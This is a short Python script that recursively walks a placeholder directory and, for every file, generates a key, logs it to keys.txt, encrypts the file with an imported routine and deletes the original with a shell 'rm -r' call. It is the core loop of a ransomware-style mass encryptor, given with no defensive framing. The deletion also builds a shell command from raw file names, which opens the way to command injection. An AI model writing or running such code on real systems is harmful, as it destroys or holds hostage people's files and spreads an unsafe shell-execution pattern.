import os
from key_gen import key_gen
from encrypt import enc_process

def main():
    for (path,dirs,files) in os.walk('CHANGE HERE',topdown=True):        #CHANGE HERE      /    path of encrypt
            for file in files:
                if True:
                    file = path+'/'+file
                    key_gen()                                       # generate the key
                    with open('mykey.key','r') as key_book:         # open file with key generated
                        key = key_book.read()                       # save key generated into the "key" variable
                        with open('keys.txt','a') as keys_file:     # open file 'keys.txt' and save "KEY" and "name FILE"
                            keys_file.write('\nFILE: '+file)
                            keys_file.write('\nKEYPASSWORD: '+ key)
                    enc_process(file)                               # encrypt process!
                    os.system('rm -r '+file)

main()
